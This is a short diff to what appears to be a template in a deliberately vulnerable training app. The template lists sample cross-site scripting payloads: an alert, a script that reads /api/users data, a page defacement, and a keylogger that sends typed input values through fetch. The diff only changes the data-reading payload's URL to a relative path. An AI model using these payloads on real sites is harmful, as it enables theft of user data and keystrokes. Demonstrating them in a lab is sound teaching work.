@@ -54,7 +54,7 @@
 
       {% set payloads = [
         ("<script>alert('XSS by '+document.domain)</script>", "Basic stored XSS"),
-        ("<script>fetch('http://localhost:5000/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d[0])))</script>", "Steal API data"),
+        ("<script>fetch('/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d[0])))</script>", "Steal API data"),
         ("<img src=x onerror=\"document.body.style.background='red'\">", "Page defacement"),
         ("<script>document.querySelectorAll('input').forEach(i=>i.addEventListener('change',e=>fetch('//log?k='+e.target.value)))</script>", "Keylogger via XSS"),
       ] %}
